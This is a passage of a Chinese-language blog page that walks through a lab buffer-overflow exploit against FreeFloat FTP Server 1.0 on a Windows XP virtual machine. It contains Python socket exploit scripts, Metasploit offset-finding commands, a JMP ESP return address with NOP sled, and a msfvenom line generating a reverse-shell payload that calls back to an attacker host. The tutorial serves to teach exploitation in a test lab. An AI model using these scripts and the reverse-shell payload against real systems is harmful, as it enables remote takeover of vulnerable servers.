@@ -1,0 +1,1009 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="FTP溢出漏洞分析, FightingTree">
+    <meta name="description" content="缓冲区溢出
+缓冲区：暂时置放输出或输入资料的内存
+缓冲区溢出：缓冲区溢出是指当计算机向缓冲区填充数据时超出了缓冲区本身的容量，溢出的数据覆盖在合法数据上。
+
+溢出漏洞测试测试准备
+渗透测试目标：FreeFloat FTP Server1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>FTP溢出漏洞分析 | FightingTree</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+    <style type="text/css">
+        
+    </style>
+
+    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+
+<header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">FightingTree</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
+<ul class="right">
+    
+    <li class="hide-on-med-and-down">
+        <a href="/" class="waves-effect waves-light">
+            
+            <i class="fa fa-home"></i>
+            
+            <span>首页</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/tags" class="waves-effect waves-light">
+            
+            <i class="fa fa-tags"></i>
+            
+            <span>标签</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/categories" class="waves-effect waves-light">
+            
+            <i class="fa fa-bookmark"></i>
+            
+            <span>分类</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/archives" class="waves-effect waves-light">
+            
+            <i class="fa fa-archive"></i>
+            
+            <span>归档</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/about" class="waves-effect waves-light">
+            
+            <i class="fa fa-user-circle-o"></i>
+            
+            <span>关于我</span>
+        </a>
+    </li>
+    
+    <li class="hide-on-med-and-down">
+        <a href="/friends" class="waves-effect waves-light">
+            
+            <i class="fa fa-address-book"></i>
+            
+            <span>友情链接</span>
+        </a>
+    </li>
+    
+    <li>
+        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
+        </a>
+    </li>
+</ul>
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">FightingTree</div>
+        <div class="logo-desc">
+            
+            No pains, No gains.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li>
+            <a href="/" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-home"></i>
+                
+                首页
+            </a>
+        </li>
+        
+        <li>
+            <a href="/tags" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-tags"></i>
+                
+                标签
+            </a>
+        </li>
+        
+        <li>
+            <a href="/categories" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-bookmark"></i>
+                
+                分类
+            </a>
+        </li>
+        
+        <li>
+            <a href="/archives" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-archive"></i>
+                
+                归档
+            </a>
+        </li>
+        
+        <li>
+            <a href="/about" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-user-circle-o"></i>
+                
+                关于我
+            </a>
+        </li>
+        
+        <li>
+            <a href="/friends" class="waves-effect waves-light">
+                
+                <i class="fa fa-fw fa-address-book"></i>
+                
+                友情链接
+            </a>
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/fightingtree/fightingtree.github.io" class="waves-effect waves-light" target="_blank">
+                <i class="fa fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #c2185b;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/fightingtree/fightingtree.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://pic.superbed.cn/item/5db3fa428b58bc7bf71e4760.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <div class="description center-align post-title">
+                        FTP溢出漏洞分析
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        margin: 35px 0 15px 0;
+        padding-left: 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #c2185b;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+    }
+
+    #toc-content .is-active-link {
+        color: #c2185b;
+    }
+
+    #toc-content .is-active-link::before {
+        background-color: #c2185b;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 20px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%AE%89%E5%85%A8/" target="_blank">
+                                <span class="chip bg-color">安全</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank">
+                                <span class="chip bg-color">漏洞分析</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fa fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E5%AE%89%E5%85%A8/" class="post-category" target="_blank">
+                                安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                <div class="post-date info-break-policy">
+                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2019-11-26
+                </div>
+
+                
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
+                        3k
+                    </div>
+                    
+
+                    
+                    <div class="info-break-policy">
+                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                        10 分
+                    </div>
+                    
+                
+				
+				
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><ul>
+<li>缓冲区：暂时置放输出或输入资料的内存</li>
+<li>缓冲区溢出：缓冲区溢出是指当计算机向缓冲区填充数据时超出了缓冲区本身的容量，溢出的数据覆盖在合法数据上。</li>
+</ul>
+<h2 id="溢出漏洞测试"><a href="#溢出漏洞测试" class="headerlink" title="溢出漏洞测试"></a>溢出漏洞测试</h2><h3 id="测试准备"><a href="#测试准备" class="headerlink" title="测试准备"></a>测试准备</h3><ul>
+<li>渗透测试目标：FreeFloat FTP Server1.0，该软件带有溢出漏洞</li>
+<li>WindowsXP系统:将该软件放入WindowsXP中，IP地址为192.168.75.130</li>
+<li>Windows 7系统：对该软件进行测试，该主机需带装有python运行环境，IP地址为192.168.75.131。</li>
+<li>Kali Linux系统</li>
+</ul>
+<h3 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h3><h4 id="在WindowsXP中运行软件"><a href="#在WindowsXP中运行软件" class="headerlink" title="在WindowsXP中运行软件"></a>在WindowsXP中运行软件</h4><p>如图所示：<br><img src="https://pic3.superbed.cn/item/5df5bba3a4fbc8614a805eb2.jpg" alt=""></p>
+<h4 id="在Windows7中开始测试"><a href="#在Windows7中开始测试" class="headerlink" title="在Windows7中开始测试"></a>在Windows7中开始测试</h4><h5 id="正常登录"><a href="#正常登录" class="headerlink" title="正常登录"></a>正常登录</h5><p>在终端依次输入以下命令连接FTP：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">ftp</span>
+<span class="token function">open</span> 192.168.75.130  //WindowsXP的IP地址</code></pre>
+<p>输入任意用户名和密码登录到FTP，如图所示：<br><img src="https://pic2.superbed.cn/item/5df5bd1aa4fbc8614a809a19.jpg" alt=""></p>
+<p>现在我们已经成功登录，可以使用FTP中的任意资源了。(这里使用任何一个用户名都可以成功登录)</p>
+<h5 id="溢出测试"><a href="#溢出测试" class="headerlink" title="溢出测试"></a>溢出测试</h5><p>我们重复正常登录的步骤，只不过此次测试的用户名和密码我们可以输入超长字符串进行测试，测试的同时使用wiresharke进行抓包分析：<br>测试1(超长字符串a，字符串长度随机)：<br><img src="https://pic2.superbed.cn/item/5df5be68a4fbc8614a80ec2e.jpg" alt=""><br>对上述操作所抓取的数据包如下所示：<br><img src="https://pic3.superbed.cn/item/5df5c192a4fbc8614a819df9.jpg" alt=""></p>
+<p>测试2(超长字符串b，字符串长度随机)：<br><img src="https://pic2.superbed.cn/item/5df5c4cea4fbc8614a822fa3.jpg" alt=""><br>对上述操作所抓取的数据包如下所示：<br><img src="https://pic.superbed.cn/item/5df5c803a4fbc8614a82bb2b.jpg" alt=""></p>
+<p>进行上述测试后，我们发现目标的系统仍然正常登录，系统并没有崩溃。但是，对数据包进行分析，我们会发现不论我们随机输入多少超长字符串，最终发送的只有78个字符(a、b)，显然这个长度的字符串无法引起溢出，但是我们可以通过自行构造数据包，然后将数据包发送出去。</p>
+<h5 id="用Python编写数据包"><a href="#用Python编写数据包" class="headerlink" title="用Python编写数据包"></a>用Python编写数据包</h5><p>在Windows 7中安装Python运行环境(IDLE),在IDLE中执行下列代码：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> socket  <span class="token comment" spellcheck="true">#导入需要使用的socket库</span>
+s <span class="token operator">=</span> socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#创建一个套接字</span>
+connect <span class="token operator">=</span> s.connect<span class="token punctuation">((</span><span class="token string">'192.168.75.130'</span><span class="token punctuation">)</span>，21<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#利用套接字建立目标的连接</span>
+s.send<span class="token punctuation">(</span><span class="token string">'USER aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\r\n'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#通过套接字将随机超长字符串(上百位)以数据包的形式发送出去</span></code></pre>
+<p>在WindowsXP界面出现如下窗口则证明发送溢出：<br><img src="https://pic.downk.cc/item/5e8ad454504f4bcb04ea2762.jpg" alt=""><br>点击生成错误报告，可以查看发生错误的地址信息：<br><img src="https://pic.downk.cc/item/5e8ad46d504f4bcb04ea4109.png" alt=""></p>
+<h3 id="计算软件溢出的偏移地址"><a href="#计算软件溢出的偏移地址" class="headerlink" title="计算软件溢出的偏移地址"></a>计算软件溢出的偏移地址</h3><p>EIP寄存器：用来存储CPU要读取指令的地址<br>根据错误报告的地址信息，以及溢出原理，出现这种情况的原因是下一条保存地址的EIP寄存器中的地址被溢出的字符“a”所覆盖,”\x61”(16进制)在ASCII表中表示的就是字符’a,也就是说现在EIP寄存器的内容就是’aaaa’,而操作系统无法在这个位置找到一条可以执行的命令，从而引发系统的崩溃。</p>
+<p>我们可以在错误报告中看到EIP寄存器的地址，但是程序在操作系统中的执行是动态的，也就是说每一次这个软件执行时所分配的地址都是不同的，所以我们现在需要知道EIP寄存器相对于输入数据起始位置的相对偏移。</p>
+<h4 id="借助Metasploit计算溢出的相对偏移地址"><a href="#借助Metasploit计算溢出的相对偏移地址" class="headerlink" title="借助Metasploit计算溢出的相对偏移地址"></a>借助Metasploit计算溢出的相对偏移地址</h4><p>要计算EIP寄存器相对于输入数据起始位置的相对偏移，需要使用Metasploit中内置的两个工具<font color="#fb8c00">pattern_create</font>和<font color="#fb8c00">pattern_offset</font></p>
+<h5 id="使用pattern-create创建字符串"><a href="#使用pattern-create创建字符串" class="headerlink" title="使用pattern_create创建字符串"></a>使用pattern_create创建字符串</h5><p>pattern_create可以用来创建一段没有重复字符的文本，我们将这段文本发送到目标服务器，当发生溢出时，记录下程序发生错误的地址(也就是EIP中的内容)，这个地址其实就是文本中的四个字符。</p>
+<p>启动Kali，打开终端输入以下指令：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/share/metasploit-framework/tools/exploit
+./pattern_create.rb -h  //pattern_create.rb是一个由ruby语言编写的脚本，使用-h参数可以查看可以使用的参数以及用法
+./pattern_create.rb -l 500 //生成一段500个字符的文本
+
+输出结果：
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq</code></pre>
+<p>在python编写的数据包将send()函数传递的超长字符串换为上述文本，即在编写数据包部分将最后的传输数据部分替换为：</p>
+<pre class=" language-bash"><code class="language-bash">s.send<span class="token punctuation">(</span><span class="token string">'USER Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq\r\n'</span><span class="token punctuation">)</span></code></pre>
+<p>同样地，该超长字符串会引发windowsXP中的FTP软件的溢出错误，我们同样可以根据错误报告获得溢出的地址：<br><img src="https://pic.downk.cc/item/5e8ad482504f4bcb04ea58a9.png" alt=""></p>
+<h5 id="使用pattern-offset计算偏移地址"><a href="#使用pattern-offset计算偏移地址" class="headerlink" title="使用pattern_offset计算偏移地址"></a>使用pattern_offset计算偏移地址</h5><p>在Kali终端输入以下命令：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/share/metasploit-framework/tools/exploit
+./pattern_offset.rb -h  //查看帮助
+./pattern_offset.rb -q 37684136 -l 500 //-q后的参数为上述错误报告中的出错地址，-l为pattern_create中生成字符串的长度
+
+输出结果：230</code></pre>
+<p>上述命令的输出结果230就是EIP寄存器相对于输入数据起始位置的相对偏移，所以我们只需提供230个字符”a”就可以使FTP发生溢出错误。我们重复之前的步骤，将python构建数据包的步骤改为执行下列代码：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> socket
+buf <span class="token operator">=</span> <span class="token string">"\x61"</span>*230+<span class="token string">"\x62"</span>*4  //230个<span class="token string">'a'</span>字符，4个<span class="token string">'b'</span>字符
+target <span class="token operator">=</span> <span class="token string">"192.168.75.130"</span>  //FTP所在主机的IP地址
+s <span class="token operator">=</span> socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span>
+s.connect<span class="token variable"><span class="token punctuation">((</span>target<span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">))</span></span>
+s.send<span class="token punctuation">(</span><span class="token string">"USER "</span>+buf+<span class="token string">"\r\n"</span><span class="token punctuation">)</span>
+s.close<span class="token punctuation">(</span><span class="token punctuation">)</span>   //关闭套接字</code></pre>
+<p>执行结束后可以看到FTP程序已经崩溃，并且产生如下图所示错误报告：<br><img src="https://pic.downk.cc/item/5e8ad494504f4bcb04ea6a1c.png" alt=""><br>从上图的错误地址62626262可以看出，EIP的地址已经为字符“bbbb”，这验证了我们找到的偏移地址的正确性。</p>
+<h3 id="查找JMP-ESP指令"><a href="#查找JMP-ESP指令" class="headerlink" title="查找JMP ESP指令"></a>查找JMP ESP指令</h3><p>ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶<br>EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</p>
+<p>因为操作系统在程序的每一次执行过程中都会为其分配不同的地址，所以即使我们可以决定程序下一步执行的地址(EIP中的内容)，但是不知道我们的攻击载荷位于哪个位置，所以还是没有办法让目标服务器执行这个恶意的攻击载荷。</p>
+<p>接下来我们就要想个办法，让EIP中的地址指向我们的攻击载荷，我们首先需要看一下输入的用户名数据在执行时是如何分布的，如下图所示：<br><img src="https://pic.downk.cc/item/5e8ad4aa504f4bcb04ea7fdd.jpg" alt=""></p>
+<p>按照栈的设计，ESP寄存器应该就位于EIP寄存器之后(中间可能有一些空隙)，如下图所示：<br><img src="https://pic.downk.cc/item/5e8ad4ba504f4bcb04ea9334.jpg" alt=""><br>因为这种设计，ESP寄存器就是我们最理想的选择，原因如下：</p>
+<ol>
+<li>我们在使用大量字符来溢出栈的时候，也可以使用特定的字符来覆盖ESP</li>
+<li>我们虽然无法对ESP寄存器进行定位，但是可以利用一条“JMP ESP”(汇编指令)的跳转指令来实现跳转到当前ESP寄存器。</li>
+</ol>
+<h4 id="查找地址不会改变的JMP-ESP指令"><a href="#查找地址不会改变的JMP-ESP指令" class="headerlink" title="查找地址不会改变的JMP ESP指令"></a>查找地址不会改变的JMP ESP指令</h4><p>接下来，我们需要做的工作是找到一条地址不会发生改变的JMP ESP指令。</p>
+<ul>
+<li>ntdll.dll(NT Layer DLL)是Windows NT操作系统的重要模块，属于系统级别的文件。用于堆栈释放、进程管理。</li>
+<li>kernel32.dll是Windows 9x/Me中非常重要的32位动态链接库文件，属于内核级文件，它控制着系统的内存管理、数据的输入输出操作和中断处理，当Windows启动时，kernel.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域。</li>
+<li>一些经常会用到的动态链接会被映射到内存，如kernel32.dll、user32.dll会被几乎所有进程加载，且加载的基址始终相同(不同的操作系统可能不同)。我们只需在这些动态链接库中找到JMP ESP命令就可以了，此时我们找到的JMP ESP的地址就一直都不会变。</li>
+</ul>
+<p>dll文件中的JMP ESP指令的地址可以通过调试器或代码执行找到。</p>
+<h3 id="编写渗透测试程序"><a href="#编写渗透测试程序" class="headerlink" title="编写渗透测试程序"></a>编写渗透测试程序</h3><h4 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h4><p>现在我们找到的JMP ESP指令的地址(假设为7C9D30D7)还存在一个问题，同样的地址数据在网络传输和CPU存储时的表示方法是不同的：</p>
+<ul>
+<li>大端(Big-Endian)：高位在前(其中“前”是指靠近内存的低地址，存储在硬盘上就是先写的字节)</li>
+<li>小端(Little-Endian):低位在前(低位字节存储在内存低地址，字节高低顺序和内存高低顺序相同)</li>
+</ul>
+<p>网络字节序(Network Byte Order)一般指大端(对大部分网络传输协议而言)，大小端的概念是面向多字节数据类型的存储方式定义的。</p>
+<h4 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h4><p>我们找到的JMP ESP的地址(7C9D30D7)其实是小端格式，如果我们希望使用7C9D30D7来覆盖目标地址，在使用Python编写渗透程序时就应该倒置地址’\xD7\x30\x9D\x7C’<br>此时，我们的脚本应为：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> socket
+s <span class="token operator">=</span> socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span>
+connect <span class="token operator">=</span> s.connect<span class="token punctuation">((</span><span class="token string">'192.168.75.130'</span>,21<span class="token punctuation">))</span>
+buf <span class="token operator">=</span> <span class="token string">"\x61"</span>*230+<span class="token string">"\xD7\x30\x9D\x7C"</span>  //填充230个<span class="token string">'a'</span>后到达EIP寄存器，<span class="token string">"\xD7\x30\x9D\x7C"</span>就是此时EIP寄存器中的内容
+s.send<span class="token punctuation">(</span><span class="token string">'USER'</span>+buf+<span class="token string">"\r\n"</span><span class="token punctuation">)</span></code></pre>
+<p>要对目标主机进行缓冲区溢出攻击，只需在传送的数据之后加上我们想要目标计算机上执行的代码即可(即payload)，详情请对shellcode编程进行了解，下文我们采用shellcode代替这部分代码：</p>
+<pre class=" language-bash"><code class="language-bash"><span class="token function">import</span> socket
+s <span class="token operator">=</span> socket.socket<span class="token punctuation">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="token punctuation">)</span>
+connect <span class="token operator">=</span> s.connect<span class="token punctuation">((</span><span class="token string">'192.168.75.130'</span>,21<span class="token punctuation">))</span>
+buf <span class="token operator">=</span> <span class="token string">"\x61"</span>*230+<span class="token string">"\xD7\x30\x9D\x7C"</span>+shellcode  //填充230个<span class="token string">'a'</span>后到达EIP寄存器，<span class="token string">"\xD7\x30\x9D\x7C"</span>就是此时EIP
+寄存器中的内容
+s.send<span class="token punctuation">(</span><span class="token string">'USER'</span>+buf+<span class="token string">"\r\n"</span><span class="token punctuation">)</span></code></pre>
+<blockquote>
+<p>注：shellcode也可以使用metasploit来生成： msfvenom -p windows/shell_reverse_tcp LHOST=192.168.75.129 LPORT=443 -b ‘\x00\x0a\x40’(坏字符) -f c</p>
+</blockquote>
+<h5 id="加入空指令"><a href="#加入空指令" class="headerlink" title="加入空指令"></a>加入空指令</h5><p>完成上述操作后，目标的系统FTP已经崩溃，但是，我们的shell代码却没有启动，原因就是ESP的地址向后发生了偏移，这样就导致了shellcode的代码并没有完全载入到ESP中，最前面的一部分在ESP的外面，从而导致程序不能正常执行。</p>
+<p>解决上述问题的一个方法就是加入空指令”\x90”(NOPS),这个指令不会执行任何实际操作，但它也是一条指令，因此会顺序地向下执行这样即使我们不知道ESP的真实地址，只需要在EIP后面添加一些空指令，只要这些空指令足够多到将shellcode偏移进ESP，就可以顺利执行shellcode。所以此时，我们的脚本代码中的buf应该改为以下代码：</p>
+<pre class=" language-bash"><code class="language-bash">buf <span class="token operator">=</span> <span class="token string">"\x61"</span>*230+<span class="token string">"\xD7\x30\x9D\x7C"</span>+<span class="token string">"\x90"</span>*20+shellcode //</code></pre>
+<h3 id="坏字符"><a href="#坏字符" class="headerlink" title="坏字符"></a>坏字符</h3><p>虽然上述渗透测试程序编写得很成功，但是在实际中却未必如此顺利。我们在上述示例中发送的数据都是FTP用户名的内容，如果FTP对用户名输入有限制，并过滤了一些字符，而我们的shellcode中也包含了这种不被允许的字符，就可能导致FTP服务器拒绝接收后面的内容，从而导致代码只传了一部分。所以找出坏字符也是我们溢出漏洞攻击的一个重要环节。</p>
+
+            </div>
+            <hr/>
+
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        <p class="reprint-tip">
+            <i class="fa fa-exclamation-triangle"></i>&nbsp;&nbsp;
+            <span>转载规则</span>
+        </p>
+        
+            <div class="center-align">
+                <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank">
+                    <img alt=""
+                         style="border-width:0"
+                         src="https://i.creativecommons.org/l/by/4.0/88x31.png"/>
+                </a>
+            </div>
+            <br/>
